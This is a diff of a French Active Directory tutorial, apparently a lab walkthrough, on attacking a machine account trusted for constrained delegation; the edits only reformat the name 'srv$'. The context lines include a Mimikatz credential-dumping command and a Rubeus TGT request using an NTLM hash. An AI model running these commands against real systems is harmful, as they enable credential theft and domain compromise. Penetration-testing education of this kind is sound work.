@@ -48,7 +48,7 @@ L'outil [Invoke-Recon](https://github.com/phackt/Invoke-Recon) trouvera tout cel
 
 # Scénario d'attaque  
 
-Nous allons compromettre une machine **srv$** dont l'attribut [useraccountcontrol](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) possède la valeur **trusted_to_auth_for_delegation**.  
+Nous allons compromettre une machine ```srv$``` dont l'attribut [useraccountcontrol](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) possède la valeur **trusted_to_auth_for_delegation**.  
 
 ![t2a4d]({{ site.url }}/public/images/t2a4d/recon_t2a4d.png)
 
@@ -78,7 +78,7 @@ Il ne doit être ni [Protected Users](https://docs.microsoft.com/en-us/windows-s
 
 Il sera nécessaire au préalable de compiler Rubeus (depuis le repo [Rubeus](https://github.com/GhostPack/Rubeus), lancer le projet, ```Build -> Build Solution```).  
 
-On suppose ici que la machine srv$ a été préalablement compromise et on récupère ses crédentials :  
+On suppose ici que la machine ```srv$``` a été préalablement compromise et on récupère ses crédentials :  
 ```cmd
 C:\tools> C:\tools\Mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"
 
@@ -130,7 +130,7 @@ C:\tools>dir \\DC\C$
 Access is denied.
 ```
 
-En premier, nous demandons un TGT pour le compte de service compromis *srv$* :
+En premier, nous demandons un TGT pour le compte de service compromis ```srv$``` :
 ```cmd
 C:\tools> C:\tools\Rubeus\Rubeus-master\Rubeus\bin\Debug\rubeus.exe asktgt /user:srv$ /domain:windomain.local /ntlm:b5858035cb595dd82050f9193b220232 /outfile:srv.tgt
 
